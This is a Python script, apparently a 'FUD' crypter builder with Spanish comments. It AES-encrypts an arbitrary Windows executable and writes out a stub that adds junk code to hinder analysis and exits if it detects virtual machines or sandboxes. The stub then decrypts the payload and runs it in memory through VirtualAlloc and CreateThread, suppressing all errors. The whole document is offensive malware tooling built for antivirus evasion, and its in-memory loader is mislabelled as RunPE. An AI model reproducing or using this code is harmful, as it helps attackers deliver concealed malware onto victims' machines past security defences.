import os
import sys
import secrets
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad

def cifrar_binario(data, key):
    iv = secrets.token_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, AES.block_size))
    return base64.b64encode(iv + ct)

def main():
    if len(sys.argv) < 3:
        print("Uso: python builder_crypter_exe.py <payload.exe> <stub_salida.py>")
        sys.exit(1)
    payload_path = sys.argv[1]
    stub_out = sys.argv[2]
    key = secrets.token_bytes(32)
    with open(payload_path, "rb") as f:
        payload = f.read()
    payload_enc = cifrar_binario(payload, key).decode()
    key_b64 = base64.b64encode(key).decode()

    stub = f"""# Crypter stub EXE RunPE by WodeN-4ever
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import sys
import ctypes
import struct
import threading

# ========== JUNK (inutil, anti-análisis) ==========
junk = bytearray([i ^ 0x55 for i in range(2048)])  # 2 KB de basura
def confuse1(): return sum([b for b in junk])
def confuse2(): return ''.join([chr((i%26)+65) for i in junk[:128]])
confuse1()
confuse2()
# ================================================

payload_enc = \"\"\"{payload_enc}\"\"\"
key = base64.b64decode("{key_b64}")

def descifrar_payload():
    ct = base64.b64decode(payload_enc)
    iv, data = ct[:16], ct[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    bin_data = unpad(cipher.decrypt(data), AES.block_size)
    return bin_data

def anti_vm():
    # Básico: checa procesos sospechosos de VM/Sandbox
    vm_names = ['vbox', 'vmware', 'xen', 'qemu', 'virtual', 'sandbox']
    import os
    for proc in os.popen('tasklist').read().lower().split():
        if any(vm in proc for vm in vm_names):
            sys.exit(0)
anti_vm()

def runpe(payload):
    # RunPE para cargar ejecutable en memoria (solo Windows x86/x64)
    # Basado en código público y adaptado para mínimo AV detection.
    from ctypes import wintypes

    kernel32 = ctypes.windll.kernel32
    size = len(payload)
    ptr = kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
    ctypes.memmove(ptr, payload, size)
    hThread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    kernel32.WaitForSingleObject(hThread, -1)

def main():
    bin_data = descifrar_payload()
    t = threading.Thread(target=runpe, args=(bin_data,))
    t.start()
    t.join()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
"""

    with open(stub_out, "w", encoding="utf-8") as f:
        f.write(stub)
    print(f"[+] Stub para EXE FUD generado: {stub_out}")

if __name__ == "__main__":
    main()
